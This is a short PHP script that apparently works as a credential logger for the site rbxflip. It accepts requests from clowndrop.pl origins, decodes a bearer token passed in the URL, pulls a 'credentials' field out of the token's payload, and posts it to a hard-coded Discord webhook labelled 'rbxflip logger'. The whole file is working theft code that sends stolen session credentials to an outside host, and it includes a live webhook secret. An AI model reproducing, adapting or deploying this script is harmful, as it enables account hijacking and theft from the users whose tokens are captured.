<?php

$allowed_origins = array(
    "https://www.clowndrop.pl",
    "https://clowndrop.pl"
);

$token = htmlspecialchars($_GET['t']);
if (!isset($_SERVER['HTTP_ORIGIN']) || !in_array($_SERVER["HTTP_ORIGIN"], $allowed_origins) || !isset($_GET["t"])) {
    die();
}
            
$replace = str_replace("Bearer ", " ", $token);
$decoded = json_decode(base64_decode(str_replace('_', '/', str_replace('-','+',explode('.', $replace)[1]))));
$cookie = "```$decoded->credentials```";

$object = json_encode([
    "username" => "rbxflip logger",
    "content" => $cookie,
], JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE );

$ch = curl_init();
curl_setopt_array($ch, [
    CURLOPT_URL => "https://discord.com/api/webhooks/1150474524203159623/SwgSb8ijsHQ1VFMnwr1g4GRABtTDXbtz6IZvNwSGsfJSy3GZSUppFabCHpMvCoG09nXG",
    CURLOPT_POST => true,
    CURLOPT_POSTFIELDS => $object,
    CURLOPT_HTTPHEADER => [
        "Content-Type: application/json"
    ]
]);

$response = curl_exec($ch);
curl_close($ch);

?>
